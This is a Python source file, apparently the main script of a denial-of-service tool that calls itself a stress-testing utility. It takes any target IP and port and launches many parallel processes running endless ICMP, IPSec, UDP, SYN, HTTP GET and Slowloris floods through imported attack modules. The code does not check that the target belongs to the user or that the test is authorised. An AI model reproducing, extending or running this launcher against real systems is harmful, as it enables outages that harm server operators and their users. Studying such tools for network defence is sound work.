import multiprocessing
import os
import sys
import argparse
import time

def show_error(msg):
    print("ERROR: " + str(msg) + "!")
    sys.exit(1)

try:
    import attacks.syn_flooder
    import attacks.ipsec_flooder
    import attacks.udp_flooder
    import attacks.http_flooder
    import attacks.icmp_flooder
    import attacks.lowandslow_sender
except ImportError as e:
    show_error(e)

processes_icmp = -1
processes_ficmp = 0
processes_ipsec = 0
processes_fudp = 0
processes_udp = 0
processes_syn = 0
processes_http = 0
processes_slowloris = 0

destination_ip = ""
destination_port = 0
socket_count = 0

def check_os():
    """Show warning message if the OS of the device is a Windows."""
    if sys.platform == "win32":
        print("WARNING:")
        print("This program use Scapy. Scapy is primarily being developed for Unix-like systems and works best on those platforms.")
        print("You should to change your OS, because some Scapy functions may  not be available.")
        time.sleep(5)

def add_arguments():
    """Add arguments for program executing."""
    parser = argparse.ArgumentParser(description="DoS generator tool for load / stress testing a web server. Allows making DoS attacks on 3,4 7 levels OSI. Supports ICMP, IPSec, UDP, TCP, HTTP protocols. Run the program with specified flags. To stop type Ctrl+Z.")
    parser.add_argument("-ip", help="The IP address of testing web server.")
    parser.add_argument("--port", help="The port number of testing web server (for IPSec, UDP, SYN, HTTP, Slowloris). Value must be between 1 and 65535.", type=int)
    parser.add_argument("-icmp", help="Start ICMP flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-ficmp", help="Start fragmented ICMP flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-ipsec", help="Start IPSec flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-udp", help="Start UDP flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-fudp", help="Start fragmented UDP flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-syn", help="Start SYN flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-http", help="Start HTTP GET flood with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("-slow", help="Start Slowloris with selected count of processes (between 1 and 300).", type=int)
    parser.add_argument("--sockets", help="Count of sockets, only for Slowloris.", type=int)

    return parser

def set_arguments(parser):
    """Set entered arguments to internal variables."""
    args = parser.parse_args()

    if not args.ip:
        parser.print_help()
        show_error("The IP address of web server is required")

    if not args.udp and not args.syn and not args.fudp and not args.ipsec and not args.icmp and not args.ficmp and not args.http and not args.slow:
        parser.print_help()
        show_error("At least one type of attack is required")

    if args.port:
        if args.port > 0 and args.port <= 65535:
            global destination_port
            destination_port = args.port
        else:
            parser.print_help()
            show_error("Wrong port number")

    if  (args.udp or args.syn or args.fudp or args.ipsec or args.slow or args.http) and not args.port:
        parser.print_help()
        show_error("Port number for IPSEC, UDP, TCP, HTTP, protocols is required")

    if (args.icmp or args.ficmp) and args.port and (not args.udp and not args.syn and not args.fudp and not args.ipsec and not args.http and not args.slow):
        print("WARNING: port number only for UDP, TCP, IPSEC protocols is required.")
        time.sleep(3)

    if args.icmp:
        if args.icmp > 0 and args.icmp <= 300:
            global processes_icmp
            processes_icmp = args.icmp
        else:
            parser.print_help()
            show_error("Wrong processes count")     

    if args.ficmp:
        if args.ficmp > 0 and args.ficmp <= 300:
            global processes_ficmp
            processes_ficmp = args.ficmp
        else:
            parser.print_help()
            show_error("Wrong processes count")

    if args.ipsec:
        if args.ipsec > 0 and args.ipsec <= 300:
            global processes_ipsec
            processes_ipsec = args.ipsec
        else:
            parser.print_help()
            show_error("Wrong processes count")

    if args.syn:
        if args.syn > 0 and args.syn <= 300:
            global processes_syn
            processes_syn = args.syn
        else:
            parser.print_help()
            show_error("Wrong processes count 100")

    if args.udp:
        if args.udp > 0 and args.udp <= 300:
            global processes_udp
            processes_udp = args.udp
        else:
            parser.print_help()
            show_error("Wrong processes count 100")

    if args.fudp:
        if args.fudp > 0 and args.fudp <= 300:
            global processes_fudp
            processes_fudp = args.fudp
        else:
            parser.print_help()
            show_error("Wrong processes count")

    if args.http:
        if args.http > 0 and args.http <= 300:
            global processes_http
            processes_http = args.http
        else:
            parser.print_help()
            show_error("Wrong processes count")

    if args.slow:
        if args.slow > 0 and args.slow <= 300:
            if not args.sockets:
                parser.print_help()
                show_error("Sockets count is required")
            if args.sockets >= 1 and args.sockets <= 1000:
                global socket_count
                socket_count = args.sockets
            else:
                parser.print_help()
                show_error("Wrong sockets count")

            global processes_slowloris
            processes_slowloris = args.slow
        else:
            parser.print_help()
            show_error("Wrong processes count")

    if not args.slow and args.sockets:
        print("WARNING: sockets only for Slowloris are required.")
        time.sleep(3)

    global destination_ip
    destination_ip = args.ip

def start_ficmp():
    while True:
        attacks.icmp_flooder.send_fragmented_icmp_packet(destination_ip)

def start_icmp():
    while True:
        attacks.icmp_flooder.send_icmp_packet(destination_ip)

def start_ipsec():
    while True:
        attacks.ipsec_flooder.send_ipsec_packet(destination_ip, destination_port)

def start_syn():
    while True:
        attacks.syn_flooder.send_syn_packet(destination_ip, destination_port)

def start_fudp():
    while True:
        attacks.udp_flooder.send_fragmented_udp_packet(destination_ip, destination_port)

def start_udp():
    while True:
        attacks.udp_flooder.send_udp_packet(destination_ip, destination_port)

def start_http_get():
    while True:
        attacks.http_flooder.send_get_packet(destination_ip, destination_port)

def start_slowloris():
    attacks.lowandslow_sender.start_slowloris(destination_ip, destination_port, socket_count)

def start_attack():
    """Start execute choosed multiple functions in parallel"""
    processes = []

    for i in range(0, processes_icmp):
        processes.append(multiprocessing.Process(target=start_icmp))
    for i in range(0, processes_ficmp):
        processes.append(multiprocessing.Process(target=start_ficmp))
    for i in range(0, processes_ipsec):
        processes.append(multiprocessing.Process(target=start_ipsec))
    for i in range(0, processes_fudp):
        processes.append(multiprocessing.Process(target=start_fudp))
    for i in range(0, processes_udp):
        processes.append(multiprocessing.Process(target=start_udp))
    for i in range(0, processes_syn):
        processes.append(multiprocessing.Process(target=start_syn))
    for i in range(0, processes_http):
        processes.append(multiprocessing.Process(target=start_http_get))
    for i in range(0, processes_slowloris):
            processes.append(multiprocessing.Process(target=start_slowloris))

    for process in processes:
        process.start()

    for process in processes:
        process.join()

def main():
    """Start the execution of program."""
    try:
        check_os()
        set_arguments(add_arguments())
        start_attack()
    except AttributeError as e:
        show_error(e)
    except TypeError as e:
        show_error(e)
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        show_error(e)

if __name__ == '__main__':
    main()